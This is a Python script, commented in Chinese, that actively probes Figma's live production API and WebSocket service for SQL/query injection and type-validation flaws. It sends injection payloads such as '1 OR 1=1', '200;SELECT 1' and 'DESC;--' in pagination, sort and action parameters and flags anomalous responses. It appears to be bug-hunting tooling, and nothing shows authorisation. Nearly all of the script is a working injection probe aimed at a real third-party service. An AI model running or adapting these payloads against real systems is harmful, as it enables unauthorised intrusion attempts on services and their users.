"""Figma 分页/排序参数注入探测（匿名,公开文件,合规）
目标：page_size / firstPageSize / sortOrder / count 是否存在 SQL/查询注入或类型校验缺陷
"""
import json, sys, time
import requests
import websocket

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

PUBLIC_FILE = "bv2nMIdFf4u3dESGail4sm"
COMMIT = "5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"
HASH_RECENT = "c60c9c1b300cd65d4564a707039e9256e9a0f0642ca913891cb196159a5678b0"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36"
WS_URL_ANON = open(r"D:\scan\_figma_hunt\ws_url_anon.txt").read().strip()


def http_versions_inject():
    print("\n[A] HTTP /api/versions/{key}?page_size= 注入")
    s = requests.Session()
    s.headers.update({"User-Agent": UA, "Accept": "application/json"})
    payloads = ["200", "0", "-1", "99999999999999999999", "abc", '"1 OR 1=1"', "1;--", "1 OR 1=1",
                "25%00", "[1]", '{"a":1}', "1.5", "1e3", "200;SELECT 1"]
    for p in payloads:
        try:
            r = s.get(f"https://www.figma.com/api/versions/{PUBLIC_FILE}?page_size={p}", timeout=12)
            body = r.text[:110].replace("\n", " ")
            flag = ""
            if r.status_code != 200 or "error" in r.text[:60]:
                flag = "  <-- 异常"
            print(f"  page_size={p!r:26} -> {r.status_code} len={len(r.text)} {body}{flag}")
        except Exception as e:
            print(f"  page_size={p!r} -> EXC {e}")


def ws_subscribe_inject():
    print("\n[B] WS FileBrowserPaginatedRecentFilesView 参数注入")
    cases = [
        ("正常", {"action": "view", "firstPageSize": 25, "sortOrder": "DESC"}),
        ("firstPageSize=0", {"action": "view", "firstPageSize": 0, "sortOrder": "DESC"}),
        ("firstPageSize=-1", {"action": "view", "firstPageSize": -1, "sortOrder": "DESC"}),
        ("firstPageSize=超大", {"action": "view", "firstPageSize": 999999999999, "sortOrder": "DESC"}),
        ("firstPageSize=字符串", {"action": "view", "firstPageSize": "25 OR 1=1", "sortOrder": "DESC"}),
        ("sortOrder=ASC", {"action": "view", "firstPageSize": 25, "sortOrder": "ASC"}),
        ("sortOrder=注入", {"action": "view", "firstPageSize": 25, "sortOrder": "DESC;--"}),
        ("sortOrder=数字", {"action": "view", "firstPageSize": 25, "sortOrder": 1}),
        ("sortOrder=随机串", {"action": "view", "firstPageSize": 25, "sortOrder": "zzz_random"}),
        ("action=注入", {"action": "view;--", "firstPageSize": 25, "sortOrder": "DESC"}),
    ]
    for label, args in cases:
        try:
            ws = websocket.create_connection(WS_URL_ANON, timeout=15, origin="https://www.figma.com",
                                             header=[f"User-Agent: {UA}"])
            ws.send(json.dumps({"messageType": "auth", "clientType": "web",
                                "args": {"userId": None, "anonymousUserId": None},
                                "tags": {"clientType": "web", "commitHash": COMMIT,
                                         "clientUrl": "https://www.figma.com/file/bv2nMIdFf4u3dESGail4sm"},
                                "clientRequestedVersion": 2}))
            time.sleep(1.5)
            ws.send(json.dumps({"messageType": "subscribe", "viewName": "FileBrowserPaginatedRecentFilesView",
                                "viewHash": HASH_RECENT, "loadType": "initial", "args": args}))
            got, err = [], []
            end = time.time() + 5
            while time.time() < end:
                try:
                    ws.settimeout(2)
                    opcode, data = ws.recv_data()
                    if opcode != 0x1:
                        continue
                    msg = json.loads(data)
                    mt = msg.get("messageType", "?")
                    if mt == "denormalizedPendingMutations":
                        got.append(len(json.dumps(msg.get("mutations", {}))))
                    elif mt == "error":
                        err.append(json.dumps(msg, ensure_ascii=False)[:160])
                except Exception:
                    break
            ws.close()
            flag = ""
            if err:
                flag = "  <-- ERROR: " + err[0]
            print(f"  {label:24} -> mutations:{len(got)} 最大payload:{max(got) if got else 0}{flag}")
        except Exception as e:
            print(f"  {label:24} -> EXC {e}")


if __name__ == "__main__":
    http_versions_inject()
    ws_subscribe_inject()
    print("\n===== 完成 =====")
